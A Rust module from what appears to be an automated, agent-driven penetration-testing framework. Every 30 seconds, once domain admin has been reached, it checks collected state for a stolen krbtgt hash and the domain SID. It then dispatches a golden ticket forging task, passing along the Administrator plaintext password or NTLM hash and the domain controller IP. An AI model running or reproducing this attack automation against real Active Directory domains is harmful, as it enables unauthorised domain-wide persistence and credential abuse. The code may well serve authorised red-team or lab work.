//! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::dispatcher::Dispatcher;

/// Monitors for krbtgt hash and triggers golden ticket forging.
/// Interval: 30s. Matches Python `_auto_golden_ticket`.
pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let state = dispatcher.state.read().await;

        // Skip if already have golden ticket
        if state.has_golden_ticket {
            continue;
        }

        // Skip if no domain admin yet
        if !state.has_domain_admin {
            continue;
        }

        // Look for krbtgt hash
        let krbtgt_hash = state
            .hashes
            .iter()
            .find(|h| h.username.to_lowercase() == "krbtgt");

        let krbtgt = match krbtgt_hash {
            Some(h) => h.clone(),
            None => continue,
        };

        let domain = if !krbtgt.domain.is_empty() {
            krbtgt.domain.clone()
        } else {
            match state.domains.first() {
                Some(d) => d.clone(),
                None => continue,
            }
        };

        // Require domain SID before dispatching — without it the agent
        // would need to call get_sid which may fail if only hash creds exist.
        let domain_sid = match state.domain_sids.get(&domain.to_lowercase()).cloned() {
            Some(sid) => sid,
            None => {
                // SID not cached yet; wait for secretsdump result processing
                drop(state);
                continue;
            }
        };

        // Look up a DC IP for this domain
        let dc_ip = state
            .domain_controllers
            .get(&domain.to_lowercase())
            .cloned();

        // Find the best credential for the domain: prefer plaintext, fall back to NTLM hash.
        let admin_cred = state
            .credentials
            .iter()
            .find(|c| {
                c.username.to_lowercase() == "administrator"
                    && c.domain.to_lowercase() == domain.to_lowercase()
            })
            .cloned();
        let admin_hash = state
            .hashes
            .iter()
            .find(|h| {
                h.username.to_lowercase() == "administrator"
                    && h.domain.to_lowercase() == domain.to_lowercase()
                    && h.hash_type.to_uppercase() == "NTLM"
            })
            .cloned();

        drop(state);

        // Submit golden ticket forging task
        let mut payload = json!({
            "technique": "golden_ticket",
            "vuln_type": "golden_ticket",
            "domain": domain,
            "krbtgt_hash": krbtgt.hash_value,
            "username": "Administrator",
            "domain_sid": domain_sid,
        });
        if let Some(ip) = dc_ip {
            payload["dc_ip"] = json!(ip);
        }
        if let Some(ref cred) = admin_cred {
            payload["admin_password"] = json!(cred.password);
            payload["admin_domain"] = json!(cred.domain);
        }
        if let Some(ref hash) = admin_hash {
            payload["admin_hash"] = json!(hash.hash_value);
            payload["admin_domain"] =
                json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
        }
        if let Some(ref aes) = krbtgt.aes_key {
            payload["aes_key"] = json!(aes);
        }

        match dispatcher
            .throttled_submit("exploit", "privesc", payload, 1)
            .await
        {
            Ok(Some(task_id)) => {
                info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
                // Mark has_golden_ticket immediately to prevent re-dispatch.
                // The result processing will also confirm on task completion
                // (detects "Saving ticket in *.ccache" in tool output).
                if let Err(e) = dispatcher
                    .state
                    .set_golden_ticket(&dispatcher.queue, &domain)
                    .await
                {
                    warn!(err = %e, "Failed to set golden ticket flag after dispatch");
                }
            }
            Ok(None) => {}
            Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
        }
    }
}
